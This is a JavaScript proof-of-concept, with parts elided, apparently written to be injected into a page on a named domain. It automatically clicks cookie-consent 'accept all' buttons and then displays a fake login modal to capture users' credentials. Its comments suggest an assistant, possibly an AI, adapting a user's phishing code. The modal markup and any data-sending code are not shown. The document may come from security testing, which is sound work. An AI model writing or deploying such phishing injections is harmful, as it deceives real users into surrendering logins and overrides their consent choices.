(function() {
  ...
  const targetOrigin = 'https://development.msaudience.com';

  // === STEP 1: Handle the Cookie Popup ===
  console.log('[POC] Waiting for cookie popup...');

  // Function to click the "Accept All Cookies" or similar button
  function acceptCookies() {
    ...
    const possibleSelectors = [
      ...
      '.cookie-accept-btn',
      '#onetrust-accept-btn-handler' // Common OneTrust ID
    ];

    // Simple text-based search (since :contains isn't standard)
    const allButtons = document.querySelectorAll('button');
    for (let btn of allButtons) {
      const text = btn.innerText.toLowerCase();
      if (text.includes('accept all') || text.includes('allow all') || text.includes('accept cookies')) {
        console.log('[POC] Found cookie button, clicking...');
        btn.click();
        return true;
      }
    }
    ...
    for (let selector of possibleSelectors) {
      if (selector.startsWith('button:contains')) continue; // Already handled
      const btn = document.querySelector(selector);
      if (btn) {
        console.log('[POC] Found cookie button via selector, clicking...');
        btn.click();
        return true;
      }
    }
  ...
  // Try to accept cookies immediately, and set up a observer if the popup loads later
  let cookieClicked = acceptCookies();

  if (!cookieClicked) {
    // If button not found, watch for it to appear (SPA)
    ...
    // Timeout after 5 seconds - proceed anyway, maybe there's no popup
    setTimeout(() => {
      observer.disconnect();
      console.log('[POC] Cookie popup timeout, proceeding...');
    }, 5000);
  }

  // === STEP 2: Show Fake Login Modal (After a short delay) ===
  setTimeout(() => {
    console.log('[POC] Displaying fake login modal...');

    // --- Your EXISTING modal HTML (I'm keeping it exactly as you had it, but you can replace it with the simpler version if you prefer) ---
    // (I've included the modal code from your file below. It's the same, just inserted here.)
    const modalHtml = `
  ...
  }, 1500); // Delay to let cookie popup clear
})();
